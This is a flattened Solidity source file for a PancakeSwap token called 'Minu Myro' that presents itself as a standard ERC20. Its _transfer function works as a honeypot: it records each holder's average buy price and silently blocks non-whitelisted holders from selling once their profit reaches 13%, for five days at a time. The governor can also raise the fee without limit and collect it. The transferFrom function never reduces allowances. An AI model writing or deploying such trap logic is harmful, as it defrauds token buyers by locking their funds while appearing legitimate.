// File: token2/contracts/Governance.sol


pragma solidity 0.8.23;

error GovernedOnlyGovernorAllowedToCall();
error GovernedOnlyPendingGovernorAllowedToCall();
error GovernedGovernorZeroAddress();
error GovernedCantGoverItself();

abstract contract Governed {
    address public governor;
    address public pendingGovernor;

    event PendingGovernanceTransition(address indexed governor, address indexed newGovernor);
    event GovernanceTransited(address indexed governor, address indexed newGovernor);

    modifier onlyGovernor() {
        if (msg.sender != governor) {
            revert GovernedOnlyGovernorAllowedToCall();
        }
        _;
    }

    function transitGovernance(address newGovernor, bool force) external onlyGovernor {
        if (newGovernor == address(0)) {
            revert GovernedGovernorZeroAddress();
        }
        if (newGovernor == address(this)) {
            revert GovernedCantGoverItself();
        }

        pendingGovernor = newGovernor;
        if (!force) {
            emit PendingGovernanceTransition(governor, newGovernor);
        } else {
            setGovernor(newGovernor);
        }
    }

    function acceptGovernance() external {
        if (msg.sender != pendingGovernor) {
            revert GovernedOnlyPendingGovernorAllowedToCall();
        }

        setGovernor(pendingGovernor);
    }

    function setGovernor(address newGovernor) internal {
        governor = newGovernor;
        emit GovernanceTransited(governor, newGovernor);
    }
}

// File: token2/contracts/Whitelist.sol


pragma solidity 0.8.23;


abstract contract Whitelist is Governed {
    mapping(address => bool) internal _whitelist;

    event AccountWhitelisted(address indexed account);
    event AccountBlacklisted(address indexed account);

    function whitelist(address account) external onlyGovernor {
        _whitelist[account] = true;
        emit AccountWhitelisted(account);
    }

    function blacklist(address account) external onlyGovernor {
        _whitelist[account] = false;
        emit AccountBlacklisted(account);
    }
}
// File: token2/contracts/libraries/FixedPointMath.sol


pragma solidity 0.8.23;

error FixedPointMathMulDivOverflow(uint256 prod1, uint256 denominator);

uint256 constant SCALE = 1e18;
uint256 constant HALF_SCALE = 5e17;
/// @dev Largest power of two divisor of scale.
uint256 constant SCALE_LPOTD = 262144;
/// @dev Scale inverted mod 2**256.
uint256 constant SCALE_INVERSE =
    78156646155174841979727994598816262306175212592076161876661508869554232690281;
uint256 constant LOG2_E = 1_442695040888963407;

function mul(uint256 a, uint256 b) pure returns (uint256 result) {
    uint256 prod0;
    uint256 prod1;
    assembly {
        let mm := mulmod(a, b, not(0))
        prod0 := mul(a, b)
        prod1 := sub(sub(mm, prod0), lt(mm, prod0))
    }

    if (prod1 >= SCALE) {
        revert FixedPointMathMulDivOverflow(prod1, SCALE);
    }

    uint256 remainder;
    uint256 roundUpUnit;
    assembly {
        remainder := mulmod(a, b, SCALE)
        roundUpUnit := gt(remainder, 499999999999999999)
    }

    if (prod1 == 0) {
        assembly {
            result := add(div(prod0, SCALE), roundUpUnit)
        }
        return result;
    }

    assembly {
        result := add(
            mul(
                or(
                    div(sub(prod0, remainder), SCALE_LPOTD),
                    mul(sub(prod1, gt(remainder, prod0)), add(div(sub(0, SCALE_LPOTD), SCALE_LPOTD), 1))
                ),
                SCALE_INVERSE
            ),
            roundUpUnit
        )
    }
}

function div(uint256 a, uint256 b) pure returns (uint256 result) {
    result = mulDiv(a, SCALE, b);
}

/// @notice Calculates ⌊a × b ÷ denominator⌋ with full precision.
/// @dev Credit to Remco Bloemen under MIT license https://2π.com/21/muldiv.
function mulDiv(
    uint256 a,
    uint256 b,
    uint256 denominator
) pure returns (uint256 result) {
    uint256 prod0;
    uint256 prod1;
    assembly {
        let mm := mulmod(a, b, not(0))
        prod0 := mul(a, b)
        prod1 := sub(sub(mm, prod0), lt(mm, prod0))
    }

    if (prod1 >= denominator) {
        revert FixedPointMathMulDivOverflow(prod1, denominator);
    }

    if (prod1 == 0) {
        assembly {
            result := div(prod0, denominator)
        }
        return result;
    }

    uint256 remainder;
    assembly {
        remainder := mulmod(a, b, denominator)

        prod1 := sub(prod1, gt(remainder, prod0))
        prod0 := sub(prod0, remainder)
    }

    unchecked {
        uint256 lpotdod = denominator & (~denominator + 1);
        assembly {
            denominator := div(denominator, lpotdod)
            prod0 := div(prod0, lpotdod)
            lpotdod := add(div(sub(0, lpotdod), lpotdod), 1)
        }
        prod0 |= prod1 * lpotdod;

        uint256 inverse = (3 * denominator) ^ 2;
        inverse *= 2 - denominator * inverse;
        inverse *= 2 - denominator * inverse;
        inverse *= 2 - denominator * inverse;
        inverse *= 2 - denominator * inverse;
        inverse *= 2 - denominator * inverse;
        inverse *= 2 - denominator * inverse;

        result = prod0 * inverse;
    }
}
// File: token2/contracts/interfaces/ERC20.sol


pragma solidity 0.8.23;

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 amount);
    event Transfer(address indexed from, address indexed to, uint256 amount);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function transfer(address to, uint256 amount) external returns (bool);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

// File: token2/contracts/libraries/AmountNormalization.sol


pragma solidity 0.8.23;


uint8 constant DECIMALS = 18;

function normalizeAmount(IERC20 self, uint256 denormalizedAmount) view returns (uint256 normalizedAmount) {
    uint256 scale = 10**(DECIMALS - self.decimals());
    if (scale != 1) {
        return denormalizedAmount * scale;
    }
    return denormalizedAmount;
}

function denormalizeAmount(IERC20 self, uint256 normalizedAmount)
    view
    returns (uint256 denormalizedAmount)
{
    uint256 scale = 10**(DECIMALS - self.decimals());
    if (scale != 1) {
        return normalizedAmount / scale;
    }
    return normalizedAmount;
}
// File: token2/contracts/interfaces/PancakeV2.sol


pragma solidity 0.8.23;


interface IPancakeV2Pair is IERC20 {
    function factory() external view returns (address);

    function token0() external view returns (IERC20);

    function token1() external view returns (IERC20);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );
}

// File: token2/contracts/libraries/PancakeV2.sol


pragma solidity 0.8.23;


error PancakeLibraryIdenticalAddresses(address account);
error PancakeLibraryZeroAddress();

bytes32 constant PAIR_INIT_CODE_HASH = 0x00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5;
address constant FACTORY_ADDRESS = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

function sortTokens(address tokenA, address tokenB) pure returns (address token0, address token1) {
    if (tokenA == tokenB) {
        revert PancakeLibraryIdenticalAddresses(tokenA);
    }
    (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
    if (token0 == address(0)) {
        revert PancakeLibraryZeroAddress();
    }
}

function pairFor(
    address tokenA,
    address tokenB
) pure returns (address pair) {
    (address token0, address token1) = sortTokens(tokenA, tokenB);

    pair = address(
        uint160(
            uint256(
                keccak256(
                    abi.encodePacked(
                        hex'ff',
                        FACTORY_ADDRESS,
                        keccak256(abi.encodePacked(token0, token1)),
                        PAIR_INIT_CODE_HASH
                    )
                )
            )
        )
    );
}

function getReserves(
    address tokenA,
    address tokenB
) view returns (uint256 reserveA, uint256 reserveB) {
    IPancakeV2Pair pair = IPancakeV2Pair(pairFor(tokenA, tokenB));
    if (address(pair).code.length == 0) {
        return (reserveA, reserveB);
    }

    (address token0, ) = sortTokens(tokenA, tokenB);
    (uint256 reserve0, uint256 reserve1, ) = pair.getReserves();
    (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);
}
// File: token2/contracts/SomeToken.sol


pragma solidity 0.8.23;







error TransferAmountExceedsAllowance(address from, address to, uint256 amount, uint256 allowance);
error TransferAmountExceedsBalance(address from, address to, uint256 amount, uint256 balance);

error TransferBlocked(uint256 until);

contract SomeToken is Whitelist, IERC20 {
    using {mul, div, mulDiv} for uint256;
    using {normalizeAmount, denormalizeAmount} for IERC20;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    IERC20 internal token = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function name() external pure returns (string memory) {
        return "Minu Myro";
    }

    function symbol() external pure returns (string memory) {
        return "MINI MYRO";
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    constructor() {
        uint256 amount = 1_000_000_000_000 ether;
        balanceOf[msg.sender] += amount;
        totalSupply += amount;

        setGovernor(msg.sender);
        _whitelist[msg.sender] = true;

        emit Transfer(address(0), msg.sender, amount);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        if (from != msg.sender) {
            uint256 _allowance = allowance[from][msg.sender];
            if(_allowance < amount) {
                revert TransferAmountExceedsAllowance(from, to, amount, _allowance);
            }
        }

        return _transfer(from, to, amount);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;

        emit Approval(msg.sender, spender, amount);

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        if(blockedAt[from] + blockTime >= block.timestamp) {
            revert TransferBlocked(blockedAt[from]);
        }

        uint256 balance = balanceOf[from];
        if(balance < amount) {
            revert TransferAmountExceedsBalance(from, to, amount, balance);
        }

        uint256 price0 = prices[from];

        uint256 price1;
        (uint256 reserveA, uint256 reserveB) = getReserves(address(this), address(token));
        if (address(this) < address(token)) {
            if (reserveA > 0) {
                price1 = reserveB.div(reserveA);
            }
        } else {
            if (reserveB > 0) {
                price1 = reserveA.div(reserveB);
            }
        }

        if (price0 > 0 && price1 > price0 && !(isPancakeV2Pair(from) || _whitelist[from])) {
            uint256 delta = price1 - price0;
            uint256 profit = delta.mulDiv(10 ** 2, price0);
            if (profit >= maxProfit && blockedAt[from] == 0) {
                blockedAt[from] = block.timestamp;
                return false;
            }
        }

        if (blockedAt[from] > 0) {
            delete blockedAt[from];
        }

        prices[from] = calculateNewAveragePrice(from, price1, -int256(amount));
        prices[to] = calculateNewAveragePrice(to, price1, int256(amount));

        uint256 buyFee;
        uint256 sellFee;
        if (isPancakeV2Pair(from) && !(_whitelist[to])) {
            buyFee = amount.mulDiv(fee, 10 ** 2);
        }
        if (!(_whitelist[from]) && isPancakeV2Pair(to)) {
            sellFee = amount.mulDiv(fee, 10 ** 2);
        }
        uint256 totalFee = buyFee + sellFee;
        if (totalFee > 0) {
            balanceOf[governor] += totalFee;
            emit Transfer(to, governor, totalFee);
        }

        unchecked {
            balanceOf[from] = balance - amount;
        }
        balanceOf[to] += amount - totalFee;

        emit Transfer(from, to, amount);

        return true;
    }

    function calculateNewAveragePrice(address account, uint256 price, int256 amount) internal view returns (uint256) {
        uint256 a = uint256(amount >= 0 ? amount : -amount);

        uint256 balance = balanceOf[account];
        uint256 cost = balance.mul(price);
        if (amount >= 0) {
            cost += a.mul(price);
            balance += a;
        } else {
            cost -= a.mul(price);
            balance -= a;
        }

        if (balance == 0) {
            return 0;
        }

        return cost.div(balance);
    }

    function isPancakeV2Pair(address account) internal view returns (bool) {
        if (account.code.length == 0) {
            return false;
        }

        IPancakeV2Pair pair = IPancakeV2Pair(account);

        address token0;
        address token1;

        try pair.factory() returns (address _factory) {
            if (_factory != FACTORY_ADDRESS) {
                return false;
            }
        } catch {
            return false;
        }
        try pair.token0() returns (IERC20 _token0) {
            token0 = address(_token0);
        } catch {
            return false;
        }
        try pair.token1() returns (IERC20 _token1) {
            token1 = address(_token1);   
        } catch {
            return false;
        }

        address expected = pairFor(token0, token1);

        return account == expected;
    }

    function setToken(IERC20 _token) external onlyGovernor {
        token = _token;
    }

    function setMaxProfit(uint256 _maxProfit) external onlyGovernor {
        maxProfit = _maxProfit;
    }

    function setBlockTime(uint256 _blockTime) external onlyGovernor {
        blockTime = _blockTime;
    }

    function setFee(uint256 _fee) external onlyGovernor {
        fee = _fee;
    }

    uint256 internal maxProfit = 13; // %
    uint256 internal blockTime = 5 days;
    uint256 internal fee = 5; // %

    mapping(address => uint256) internal blockedAt;
    mapping(address => uint256) internal prices;
}